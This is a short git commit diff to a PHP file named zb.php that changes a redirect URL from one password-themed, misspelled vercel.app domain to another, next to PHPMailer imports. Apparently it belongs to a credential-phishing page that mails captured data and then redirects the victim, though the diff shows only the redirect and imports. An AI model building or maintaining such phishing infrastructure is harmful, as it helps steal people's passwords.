36a9af1d54682dafaa3c42262b957e78092413a0
natashawelshan <natashawelshan@gmail.com>
2025-08-19 09:25:38 -0700

    Update zb.php

--- zb.php
+++ zb.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://aprove-her-pass.vercel.app/");
+header("Location: https://password-z-aprove.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
